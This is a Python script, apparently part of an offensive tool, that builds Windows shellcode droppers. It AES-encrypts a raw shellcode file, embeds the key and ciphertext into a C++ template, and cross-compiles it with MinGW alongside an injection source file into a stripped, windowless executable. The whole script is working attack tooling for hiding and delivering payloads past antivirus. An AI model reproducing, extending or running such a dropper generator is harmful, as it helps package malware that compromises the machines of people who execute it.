#!/usr/bin/python3
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib
import os
from colorama import Fore
import argparse
from distutils.spawn import find_executable
from cmd import Cmd

# Global Variables
SHELLCODE_MARK = "//moca"
ARCHS = {"1":"x64", "2":"x86"}
DATA = []
REV_LIST = ['','','']
FILE_PATH = ''
for dir in (os.path.realpath(__file__).split('/')[:-1]):
    FILE_PATH += '/' + dir

FILE_PATH = FILE_PATH[1:] + '/'
SOURCE_FILE = FILE_PATH + "src/main.cpp"
os.chdir(FILE_PATH)

def printS(text):
    print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
def printE(text):
    print(f"""{Fore.RED}[!]{Fore.WHITE} {text}""")
def printI(text):
    print(f"""{Fore.BLUE}[*]{Fore.WHITE} {text}""",end='')

def writeToFile(mark, data):
    # i is number of lines after mark. Starts from 0!
    line = True
    lineCount = 1
    with open(SOURCE_FILE, "r") as code:
        while line:
            line = code.readline()
            if mark in line:
                break
            lineCount += 1

    targetLine = lineCount
    for i in range(len(data)):
        with open(SOURCE_FILE, "r") as a_file:
            list_of_lines = a_file.readlines()
            list_of_lines[targetLine + i] = f"        {data[i]}\n"

        with open(SOURCE_FILE, "w") as a_file:
            a_file.writelines(list_of_lines)
    # Clearing DATA buffer
    DATA = []


def encrypt(binaryPath):
    # Checking For Binary File
    try:
        binaryData = open(binaryPath, "rb").read()
    except FileNotFoundError:
        printE("No such file in directory!")
        sys.exit(1)

    KEY = get_random_bytes(16)

    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(binaryData, AES.block_size))

    key = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
    payload = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'

    return key, payload

def getMD5Hash(target):
    return hashlib.md5(target.encode('utf-8')).hexdigest()


def check_requirements():
    flag1 = find_executable("i686-w64-mingw32-g++") is not None
    flag2 = find_executable("x86_64-w64-mingw32-g++") is not None
    if ((flag1 is False) or (flag2 is False)):
        printE("MinGW cross-compiler is not Installed!")
        printI("Would you like to install it now? [Y/n]: ")
        choice = input()
        if choice == 'y' or choice == 'Y' or choice == 'yes' or choice == 'Yes':
            printS("Installing the MinGW compiler...")
            os.system("sudo apt update")
            os.system("sudo apt install mingw-w64")
        else:
            printI("Please install it manually then\n")
            sys.exit(0)

def main():

    parser = argparse.ArgumentParser(description="Simple raw shellcode Dropper Generator")
    parser.add_argument("binaryPath", help="File containing raw shellcode")
    #parser.add_argument("-t", "--target", help="Target Computer Name")
    parser.add_argument("-a", "--arch", default="1", help="Shellcode Architecture (1=x64, 2=x86) (default=x64)")
    parser.add_argument("-d", "--debug", default=False, action="store_true", help="Generate cpp code with the executable for debuging")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Showes generated Payload and Key")
    args = parser.parse_args()
    
    #if (not args.binaryPath or not args.target):
    #    printE("Missing Required Arguments!")
    #    sys.exit(1)

    binaryPath = args.binaryPath
    binaryName = binaryPath.split('/')[-1]
    outputFileName = (binaryPath.split('/')[-1]).split('.')[0]
    #targetComputerName = args.target
    check_requirements() 
    
    # Check for Unsupported ARCH
    try:
        Arch = ARCHS[args.arch]
    except KeyError:
        printE("Invalid Arch...!")
        parser.print_help()
        sys.exit(1)

    # Starting to Generate
    printI(f"Generating {Arch} Dropper for {binaryName}\n")
 
    # Encrypt shellcode
    binaryKey, binaryPayload = encrypt(binaryPath)
    if args.verbose:
        printI('Key: ' + binaryKey)
        printI('Payload ' + binaryPayload)
    #TargetComputerNameMD5Hash = getMD5Hash(targetComputerName) 
    #print(TargetComputerNameMD5Hash)

    # Write data to cpp code
    DATA.append(rf"// {binaryName}-{Arch}")
    DATA.append(f"unsigned char key[] = {binaryKey}")
    DATA.append(f"unsigned char moca[] = {binaryPayload}")
    writeToFile(SHELLCODE_MARK, DATA)
    
    #DATA.append(f"""const char* tcnhash = "{TargetComputerNameMD5Hash}";""")
    #writeToFile('Instert Target Hash', DATA)



    # Compiling Code
    if Arch == "x64":
        outputFileName += "-64"
        #os.system(f"x86_64-w64-mingw32-g++ {SOURCE_FILE} -o {outputFileName}.exe -lurlmon -fpermissive -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
        os.system(f'x86_64-w64-mingw32-g++ src/main.cpp src/crypto.cpp src/injection.cpp src/headers.h -o {outputFileName} -lurlmon -fpermissive -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc 2>/dev/null')
    #elif Arch == "x86":
        #outputFileName += "-86"
        #os.system(f"i686-w64-mingw32-g++ {SOURCE_FILE} -o {outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
    if args.debug:
        os.system(f"/usr/bin/cp {SOURCE_FILE} {outputFileName}.cpp")
        printS(f"Code saved to {outputFileName}.cpp")

    printS(f"Executable saved to {outputFileName}.exe")
    
    # Cleaing up!
    writeToFile(SHELLCODE_MARK, REV_LIST)


if __name__ == "__main__":
    main()
    #t = Terminal()
    #t.cmdloop()
